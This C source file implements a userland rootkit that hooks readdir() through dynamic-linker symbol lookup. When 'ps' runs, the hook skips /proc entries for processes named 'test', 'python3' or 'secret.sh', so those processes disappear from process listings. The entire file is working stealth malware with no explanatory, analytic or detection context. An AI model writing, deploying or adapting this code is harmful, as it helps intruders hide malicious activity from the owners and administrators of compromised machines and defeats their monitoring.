#include <stdio.h>
#include <errno.h>
#include <dirent.h>
#include <error.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>

#define NUM_NAMES 3
const char *HIDE_NAMES[NUM_NAMES] = {"test", "python3", "secret.sh"};

static struct dirent *(*old_readdir)(DIR *) = NULL;

int should_hide_process(const char *process_name) {
    for (int i = 0; i < NUM_NAMES; i++) {
        if (strcmp(process_name, HIDE_NAMES[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int is_ps_command() {
    pid_t pid = getpid();
    char path[PATH_MAX], proc_name[256];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (f) {
        if (fgets(proc_name, sizeof(proc_name), f) != NULL) {
            proc_name[strcspn(proc_name, "\n")] = 0;
            fclose(f);
            return strcmp(proc_name, "ps") == 0;
        }
        fclose(f);
    }
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (old_readdir == NULL) {
        old_readdir = dlsym(RTLD_NEXT, "readdir");
        if (old_readdir == NULL) {
            error(1, errno, "dlsym");
        }
    }

    if (!is_ps_command()) {
        return old_readdir(dirp);
    }

    struct dirent *direntp;
    while ((direntp = old_readdir(dirp)) != NULL) {
        if (direntp->d_type == DT_DIR) {
            char proc[300], name[80];
            FILE *comm;

            snprintf(proc, sizeof(proc), "/proc/%s/comm", direntp->d_name);
            comm = fopen(proc, "r");
            if (comm == NULL) continue;

            if (fgets(name, sizeof(name), comm) != NULL) {
                name[strcspn(name, "\n")] = 0;

                if (should_hide_process(name)) {
                    fclose(comm);
                    continue;
                }
            }
            fclose(comm);
        }
        break;
    }
    return direntp;
}
